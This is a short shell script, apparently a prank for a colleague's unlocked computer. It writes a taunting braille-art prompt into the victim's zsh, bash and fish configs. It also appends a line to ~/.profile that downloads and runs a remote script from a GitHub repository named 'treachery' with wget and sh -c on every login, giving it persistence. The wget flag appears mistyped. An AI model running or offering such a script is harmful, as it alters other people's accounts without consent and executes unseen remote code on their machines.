#!/bin/sh
# dash uses . not source, so this checks if that needs to be remedied
if which source 2>/dev/null >/dev/null
then
	:;
else
	alias source="."
fi

PROMPT="⠀⠀⠀⠀⡠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢄⠀⠀
⠀⠀⢀⠎⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠔⠁⠀⢣⠀
⠀⠀⡎⠀⠀⠀⠀⠑⡄⠀⠀⢠⠀⣤⡄⠀⠀⠀⠀⠀⠀⠀⢠⠊⠀⠀⠀⠀⠈⡄
⠀⢰⠁⠀⠀⠀⠀⠀⠈⠢⡀⠈⡄⠀⠀⠉⠒⠄⡀⠀⠀⡠⠃⠀⠀⠀⠀⠀⠀⢃
⠀⡌⠀⠀⠀⠀⠀⠀⠀⠀⠘⢄⡸⠦⠄⠀⠀⠀⠈⠢⡎⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⡇⠀⠀⠀⠀⠀⠀⠀⢴⣊⣁⣀⣀⠤⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇
⠀⠈⢆⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠤⢤⠤⠄⠀⠀⠀⡜⠀
⡀⠀⠈⢆⠀⠈⡟⠁⠈⣿⣿⣿⠁⠀⠀⠀⠀⢸⣿⣿⣷⠀⠀⡇⠀⠀⢀⠜⠀⠀
⠻⡐⠒⠚⠓⠠⡅⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠸⣿⣿⡏⠀⠀⣜⠀⠀⠉⠁⡼⠀
⠀⠣⣀⡀⠀⠀⢧⠀⠀⠹⣿⠟⠀⣤⣀⠀⠀⠀⠻⠛⠁⠀⠀⠛⡀⠀⣠⠔⠁⠀ You like leaving your screen
⠀⠀⢠⠃⠘⠹⠔⠓⠀⠀⠀⢀⠀⠀⢀⠀⠀⣠⠀⠀⠀⠚⠭⠚⠁⠀⠈⢆⠀⠀ unlocked, don't you?
⠀⢠⣃⣀⣀⣄⠀⠀⠀⠀⠀⠈⠑⠊⠁⠉⠉⠀⠀⠀⠀⠀⢀⡠⠤⠀⠤⠤⠇⠀
⠀⠀⠀⠀⠀⠀⠉⠒⡦⠤⢀⣀⠀⠀⠀⠀⠀⠀⠀⠐⢒⠊⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣎⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀"
echo -n "\nPS1=\"${PROMPT}\"" | tee -a ~/.zshrc | tee -a ~/.bashrc >> ~/.config/fish/config.fish
echo -n 'sh -c "$(wget -q0 - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh)"' >>~/.profile
case "${SHELL}" in
	"/bin/zsh")
		source "${HOME}/.zshrc"
		;;
	"/bin/bash")
		source "${HOME}/.bashrc"
		;;
	"/bin/fish")
		source "${HOME}/.config/fish/config.fish"
		;;
	*)
		;;
esac
clear
